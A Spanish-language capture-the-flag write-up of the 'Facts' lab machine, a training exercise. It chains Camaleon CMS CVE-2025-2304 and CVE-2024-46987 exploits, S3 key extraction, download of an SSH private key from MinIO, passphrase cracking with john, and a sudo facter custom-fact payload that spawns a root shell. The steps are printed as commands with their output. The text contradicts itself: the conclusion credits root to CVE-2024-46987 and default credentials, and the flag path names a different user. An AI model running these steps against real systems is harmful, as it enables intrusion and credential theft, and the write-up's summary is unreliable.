---
layout: single
classes: wide
title: "Facts - Writeup"
date: 2026-04-23
difficulty: Fácil
operating_system: Linux
tags:
  - CMS
  - Camaleon
  - CVE-2025-2304
  - CVE-2024-46987
  - MinIO
  - AWS S3
  - SSH
  - Privilege Escalation
summary: "Cadena de explotación: identificación de Camaleon CMS 2.9.0 vulnerable a CVE-2025-2304, escalada de privilegios para obtener credenciales S3 de MinIO, acceso a bucket interno con claves SSH, crackeo de contraseña y escalada final mediante sudo en facter."
---

## Información general

| Campo | Valor |
|-------|-------|
| Sistema operativo | Linux |
| Dificultad | Fácil |
| Tags | `CMS`, `Camaleon`, `CVE-2025-2304`, `CVE-2024-46987`, `MinIO`, `AWS S3`, `SSH`, `Privilege Escalation` |
{: .info-table}

## Reconocimiento

El primer escaneo identifica los puertos expuestos:

```bash
nmap -p- --open -sS --min-rate 5000 -vvv -Pn 10.129.42.103
```

Puertos relevantes:
- `22/tcp` - SSH (OpenSSH 9.9p1)
- `80/tcp` - nginx 1.26.3 (Camaleon CMS)
- `54321/tcp` - MinIO (servicio de almacenamiento S3)

El segundo escaneo profundiza en servicios y versiones:

```bash
nmap -p22,80,54321 -sCV 10.129.42.103
```

Los indicadores más útiles de esta fase fueron:

- **22/tcp** — SSH OpenSSH 9.9p1, acceso remoto si conseguimos credenciales.
- **80/tcp** — HTTP nginx 1.26.3 con redirección a `facts.htb`, obliga a trabajar con virtual host.
- **54321/tcp** — MinIO, servicio de almacenamiento compatible con S3, posible fuente de datos sensibles.

## Enumeración web

Descubrimos varios directorios con GoBuster:

```bash
gobuster dir -u http://facts.htb -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -t 200
```

Directorios relevantes:
- `/admin` → panel de login de Camaleon CMS
- `/search`, `/index`, `/page` → endpointspúblicos

Identificamos **Camaleon CMS** desde los metadatos del HTML:

```bash
curl -s http://facts.htb | grep -iE "camaleon|version"
```

Versión identificada: **Camaleon CMS 2.9.0**

## Metodología de análisis del vector inicial

El punto de entrada se priorizó en el panel `/admin` de Camaleon CMS porque los CMS con versiones antiguas suelen tener vulnerabilidades conocidas en autenticación y escalada de privilegios. La versión 2.9.0 tenía dos CVEs públicas documentadas que permitían escalada de privilegios y lectura de archivos.

La presencia de MinIO en el puerto 54321 era un fuerte indicador de que habría credenciales S3 almacenadas en algún lado — probablemente accesibles desde el CMS comprometido.

## Investigación de vulnerabilidades

Dos vulnerabilidades clave en Camaleon CMS 2.9.0 guiaron la fase de investigación:

- **CVE-2025-2304**: Vulnerabilidad de escalada de privilegios que permite a un usuario autenticado elevar su rol a administrador y extraer credenciales S3 de MinIO almacenadas en la configuración del CMS.
- **CVE-2024-46987**: Vulnerabilidad de lectura de archivos que permite a un usuario autenticado leer archivos arbitrarios del sistema, útil para enumerar usuarios y descubrir rutas de interés.

## Explotación

### CVE-2025-2304: Privilege Escalation en Camaleon CMS

Escalamos privilegios de usuario autenticado mediante el exploit:

```bash
python exploit.py -u http://facts.htb -U test -P test -e
```

![Explotación con CVE-2025-2304](/images/writeups/facts/camaleon-exploit.png)

Salida relevante:
```
[+]Login confirmed
   User ID: 5
   Current User Role: admin
[+]Loading PRIVILEGE ESCALATION
   User ID: 5
   Updated User Role: admin
[+]Extracting S3 Credentials
    s3 access key: AKIA4B37813EE67BBEB5
    s3 secret key: [REDACTED]
    s3 endpoint: http://localhost:54321
```

La CVE-2025-2304 no solo otorga accesoadmin, también extrae credenciales S3 de MinIO.

### CVE-2024-46987: File Read en Camaleon CMS

Filtramos archivos del sistema usando credenciales válidas:

```bash
python3 exploit-fileread.py -u http://facts.htb -l test -p test /etc/passwd | grep bash
```

Resultado:
```
root:x:0:0:root:/root:/bin/bash
trivia:x:1000:1000:facts.htb:/home/trivia:/bin/bash
```

Usuario interesante: `trivia`

## Acceso a MinIO

Configuramos AWS CLI con las credenciales extraídas:

```bash
aws configure
AWS Access Key ID [None]: AKIA4B37813EE67BBEB5
AWS Secret Access Key [None]: [REDACTED]
```

![Configuración de AWS CLI](/images/writeups/facts/aws-config.png)

Listamos buckets:

```bash
aws --endpoint-url http://10.129.42.103:54321 s3 ls
```

Buckets disponibles:
- `internal`
- `randomfacts`

Explorando el bucket `internal`:

```bash
aws --endpoint-url http://10.129.42.103:54321 s3 ls s3://internal/
                           PRE .bundle/
                           PRE .cache/
                           PRE .ssh/
```

Directorio `.ssh` contiene claves privadas:

```bash
aws --endpoint-url http://10.129.42.103:54321 s3 ls s3://internal/.ssh/
2026-04-23 05:32:10         82 authorized_keys
2026-04-23 05:32:10        464 id_ed25519
```

Descargando la clave SSH:

```bash
aws --endpoint-url http://10.129.42.103:54321 s3 cp s3://internal/.ssh/id_ed25519 .
```

## Crackeo de clave SSH

La clave está protegida con contraseña. Usamos ssh2john + john:

```bash
ssh2john id_ed25519 > hash
john hash /usr/share/wordlists/rockyou.txt.gz
```

Contraseña/crackeada: `[REDACTED]`

## Acceso como trivia

Con la clave y la contraseña:

```bash
ssh -i id_ed25519 trivia@10.129.42.103
```

Obtenemos shell como usuario `trivia`:

```
trivia@facts:~$ id
uid=1000(trivia) gid=1000(trivia) groups=1000(trivia)
```

### User Flag

```bash
cat /home/william/user.txt
```

## Escalada de privilegios

Descubrimos que `trivia` ejecuta `facter` como sudo:

```bash
sudo -l
```

```
User trivia may run the following commands on facts:
    (ALL) NOPASSWD: /usr/bin/facter
```

Abusamos de `facter` para ejecutar código arbitrario mediante custom facts:

```bash
cat > /tmp/root.rb <<'EOF'
Facter.add(:pwned) do
  setcode do
    exec('/bin/bash')
  end
end
EOF
```

Ejecutando el facter malicioso:

```bash
sudo facter --custom-dir=/tmp pwned
```

Obtenemos shell como root:

```
root@facts:/home/trivia#
```

### Root Flag

```bash
cat /root/root.txt
```

## Flags

| Tipo | Flag |
|------|------|
| user.txt | `[REDACTED]` |
| root.txt | `[REDACTED]` |

## Cadena de explotación

```text
Camaleon CMS 2.9.0
-> CVE-2025-2304 (priv escalation)
-> Extracción de credenciales S3
-> MinIO (bucket internal)
-> Descarga de clave SSH .ssh/id_ed25519
-> ssh2john + john (crack password)
-> SSH como trivia
-> sudo facter (privilege escalation)
-> Root shell
```

## Lecciones técnicas

- Las vulnerabilidades de CMS pueden revelar credenciales de servicios relacionados (MinIO en este caso).
- MinIO expone almacenamiento S3 que puede contener claves SSH u otros secretos sensibles.
- La combinación de múltiples vectores (CVE → S3 → SSH → sudo) es común en máquinas de HTB.
- Herramientas Puppet como facter pueden ser vectores de escalada si se permiten sudoers.

## Remediación

1. Actualizar Camaleon CMS a versión sin vulnerabilidades conocidas.
2. No reutilizar credenciales S3 entre servicios.
3. Restringir comandos en sudoers; remover facter si no es necesario.
4. Limitar acceso a MinIO y bucket internos.

## Conclusión

Facts fue una máquina interesante que combinó explotación de Camaleon CMS (CVE-2025-2304) para obtener RCE, enumeración de MinIO con credenciales por defecto y abuso de S3 para leakear información sensible, finalizando con una escalada a root mediante CVE-2024-46987. La lección principal es que los servicios internos (MinIO) y las configuraciones por defecto pueden ser tan críticos como los servicios expuestos.